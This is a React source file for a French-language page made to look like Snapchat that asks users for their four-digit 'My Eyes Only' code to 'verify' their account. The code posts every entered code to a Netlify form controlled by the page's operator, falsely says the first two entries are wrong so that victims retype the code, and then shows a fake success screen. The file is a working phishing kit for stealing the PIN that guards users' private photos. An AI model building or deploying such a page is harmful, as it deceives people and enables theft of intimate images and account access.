import React, { useState } from "react";
import SnapchatLogo from "../../../attached_assets/snapchat_1785772849797.png";

import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "./components/ui/input-otp";

const SnapchatGhost = () => (
  <img
    src={SnapchatLogo}
    alt="Snapchat logo"
    width="76"
    height="76"
    className="mx-auto block h-[76px] w-[76px] object-contain"
  />
);

export default function MeoPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState("");
  const [verified, setVerified] = useState(false);
  const attemptsRef = React.useRef(0);
  const returnTo =
    new URLSearchParams(window.location.search).get("returnTo") || "/";

  const submitNetlifyForm = async (
    formName: string,
    fields: Record<string, string>,
  ) => {
    if (!import.meta.env.PROD) {
      return;
    }

    const body = new URLSearchParams();
    body.set("form-name", formName);

    Object.entries(fields).forEach(([key, value]) => {
      body.set(key, value);
    });

    await fetch("/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: body.toString(),
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 4) {
      setCodeError("Veuillez saisir votre code My Eyes Only à 4 chiffres.");
      return;
    }

    await submitNetlifyForm("Snapchat-meo", {
      meoCode: code,
    });

    if (attemptsRef.current < 2) {
      attemptsRef.current += 1;
      setCode("");
      setCodeError("Ce code est incorrect. Veuillez réessayer.");
      return;
    }

    setCodeError("");
    setCode("");
    setVerified(true);
  };

  return (
    <div
      className="min-h-screen w-full font-sans text-[#111111]"
      style={{ backgroundColor: "#f2f2f2" }}
    >
      <main className="flex flex-col items-center px-4 pt-10 pb-10">
        {verified ? (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Vérification réussie
            </h1>
            <p className="mt-3 text-center text-[14px] text-[#555555]">
              Votre code My Eyes Only a été vérifié avec succès. Vous pouvez
              maintenant continuer.
            </p>
            <div className="mt-5 flex justify-center">
              <button
                type="button"
                onClick={() => window.location.assign(returnTo)}
                className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
              >
                Continuer
              </button>
            </div>
          </div>
        ) : (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Entrer votre code My Eyes Only
            </h1>
            <p className="mt-3 text-center text-[14px] text-[#555555]">
              Ce code est celui que vous utilisez pour voir vos souvenirs My
              Eyes Only dans Snapchat. Veuillez le saisir pour vérifier votre
              compte.
            </p>

            <form
              name="Snapchat-meo"
              method="POST"
              data-netlify="true"
              onSubmit={handleSubmit}
              className="mt-5"
            >
              <input type="hidden" name="form-name" value="Snapchat-meo" />
              <input type="hidden" name="meoCode" value={code} />
              <label className="block text-[13px] font-medium text-[#555555] mb-2">
                Code My Eyes Only
              </label>
              <div className="flex justify-center">
                <InputOTP
                  maxLength={4}
                  value={code}
                  onChange={(value) => {
                    setCode(value);
                    setCodeError("");
                  }}
                  className="gap-2"
                >
                  <InputOTPGroup>
                    {Array.from({ length: 4 }).map((_, i) => (
                      <InputOTPSlot
                        key={i}
                        index={i}
                        className="h-[52px] w-[52px] text-[20px] border-[1.5px] border-[#cccccc] rounded-[8px] first:border-[1.5px] last:border-[1.5px]"
                      />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
              </div>
              {codeError && (
                <p className="mt-1.5 text-center text-[13px] text-red-500">
                  {codeError}
                </p>
              )}

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Vérifier
                </button>
              </div>
            </form>
          </div>
        )}
      </main>
    </div>
  );
}
